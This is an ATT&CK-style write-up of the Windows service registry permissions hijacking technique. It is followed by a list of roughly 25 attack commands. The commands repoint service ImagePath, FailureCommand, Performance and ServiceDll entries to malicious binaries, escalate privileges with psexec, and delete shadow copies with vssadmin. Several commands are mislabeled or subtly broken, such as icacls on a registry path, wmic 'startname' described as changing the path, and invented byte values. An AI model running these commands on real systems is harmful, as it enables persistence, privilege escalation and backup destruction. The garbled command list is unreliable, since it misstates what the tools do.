        Services Registry Permissions Weakness: Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)  If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).  Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)  The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)  Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service)
          Use sc.exe to modify service binPath to point to malicious executable: `sc config "ServiceName" binPath= "C:\malicious.exe"`
          Use PowerShell Set-ItemProperty to modify service ImagePath: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name "ImagePath" -Value "C:\malicious.exe"`
          Modify FailureCommand using reg.exe: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v FailureCommand /t REG_SZ /d "C:\malicious.exe"`
          Create Performance key pointing to malicious DLL: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\Performance" /v "Library" /t REG_SZ /d "C:\malicious.dll"`
          Modify ServiceDLL parameter for svchost-hosted service: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\malicious.dll"`
          Use accesschk.exe to identify vulnerable service permissions: `accesschk.exe -kvw "HKLM\SYSTEM\CurrentControlSet\Services"`
          Create custom subkey for persistence: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\CustomKey" /v Payload /t REG_SZ /d "C:\malicious.exe"`
          Use PowerShell to corrupt service and trigger FailureCommand: `Stop-Service ServiceName -Force`
          Use WMI to modify service path: `wmic service where name="ServiceName" call change startname= "C:\malicious.exe"`
          Use icacls to grant permissions before modification: `icacls "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /grant Users:F`
          Use reg export/import to backup and modify service configuration: `reg export "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" backup.reg && reg import modified.reg`
          Modify service recovery actions through PowerShell: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name "RecoveryAction" -Value ([byte[]](0x00,0x00,0x00,0x00))`
          Use PsExec to modify service as SYSTEM: `psexec -s -i regedit.exe`
          Create registry symbolic link to redirect service path: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\SymbolicLink" /ve /d "\RPC Control\malicious"`
          Schedule registry modifications using at.exe: `at 23:00 /every:M,T,W,Th,F reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_SZ /d "C:\malicious.exe"`
          Use Group Policy to modify service permissions: `secedit /configure /db gp.db /cfg service_permissions.inf`
          Leverage reg.exe with delayed execution: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v DelayedAutostart /t REG_DWORD /d 1`
          Use Registry Transaction API to atomically modify service entries: `reg load HKLM\OFFLINE_SERVICES C:\Windows\System32\config\SYSTEM && reg import service_mod.reg`
          Create service dependency chain to ensure execution: `sc config ServiceName depend= "LegalService1/LegalService2"`
          Use registry reflection to hide modifications: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v Type /t REG_DWORD /d 0x120`
          Modify service SID type for enhanced privileges: `sc sidtype ServiceName unrestricted`
          Use PowerShell to create service trigger events: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name "TriggerInfo" -Value ([byte[]](0x01,0x00,0x00,0x00))`
          Modify registry mount points to redirect service configuration: `mountvol /r && reg load HKLM\MOUNTED_SERVICES \mounted\services`
          Disable system restore for registry keys: `vssadmin delete shadows /for=C: /quiet`
          Break permission inheritance chain: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v SecurityDescriptor /t REG_SZ /d "D:PAI(A;;GA;;;SY)"`
